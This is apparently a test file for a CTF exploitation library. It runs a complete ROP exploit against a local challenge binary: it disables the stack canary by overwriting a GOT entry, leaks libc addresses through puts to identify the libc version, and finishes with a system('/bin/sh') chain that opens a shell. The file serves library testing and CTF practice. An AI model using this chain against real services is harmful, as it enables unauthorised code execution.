from sgtlibc import Searcher
import sgtlibc.gamebox as gb

import sgtlibc.ROPgadgets
import os
from .common import get_elf_resources


def test_pwn1():
    path = get_elf_resources('pwn1')
    config = gb.GameBoxConfig(
        is_local=True,
        file=path,
    )
    gb.set_config(config)
    s = Searcher()
    # load target and show its checksec
    elf = sgtlibc.ROPgadgets.ELF(gb.client.tube_file)
    pops = elf.get_rop()
    print(pops)
    main_addr = 0x0040090B
    buf_length = 264 + 8
    puts_plt = elf.plt['puts']

    stk_chk = elf.got['__stack_chk_fail']

    def edit_addr_value(addr: int, value: bytes):
        gb.sla('your choice', '0')
        gb.sla('address:\n', str(addr))
        gb.sa('content:\n', value)

    def edit_buf_value(length: int, value: bytes):
        gb.sla('your choice', '1')
        gb.sla('size:\n', str(length))
        gb.sa('content:\n', value)

    def program_exit():
        gb.sla('your choice', '2')

    edit_addr_value(stk_chk, gb.p64(pops['ret']))

    def leak(target: str):
        puts_got = elf.got[target]
        payload = b'a' * buf_length + gb.p64(0xdeadbeef)
        payload += gb.p64(pops['rdi']) + gb.p64(puts_got) + \
            gb.p64(puts_plt) + gb.p64(main_addr)
        edit_buf_value(len(payload), payload)
        program_exit()
        gb.rl()
        libc_puts_addr = gb.u64(gb.rc(7)[:-1].ljust(8, b'\0'))
        print('target', target, hex(libc_puts_addr))
        s.add_condition(target, libc_puts_addr)
        return libc_puts_addr

    puts_got = leak('puts')
    leak('read')
    leak('__libc_start_main')
    leak('setvbuf')
    leak('atoi')
    s.decided()

    gb.close()
    for db_index, libc_version in enumerate(s.db):
        try:
            gb.pause()
            gb.set_config(config)
            edit_addr_value(stk_chk, gb.p64(pops['ret'])) # invalid stk_chk

            puts_got = leak('puts')
            gb.log.info(f'puts_got:{hex(puts_got)}')
            s.set_offset_by_function('puts', puts_got)
            gb.log.info(f'offset set to:{hex(s.offset)}')

            gb.log.info(f'try libc_version:{libc_version}')
            data = s.dump(db_index=db_index)

            libc_system = s.get_address(sgtlibc.s_system)
            libc_binsh = s.get_address(sgtlibc.s_binsh)
            # gb.pause()
            payload = b'b' * buf_length + gb.p64(0xdeadbeef)
            payload += gb.p64(pops['rdi']) + gb.p64(libc_binsh)
            payload += gb.p64(libc_system)
            edit_buf_value(len(payload), payload)
            program_exit()  # 触发溢出
            gb.rl()
            gb.sl(b'echo success me')
            data = gb.rc()
            assert data == b'success me\n'
            gb.close()
            break
        except Exception as e:
            gb.log.warning(f'invalid run on {db_index}:{libc_version},{e}')
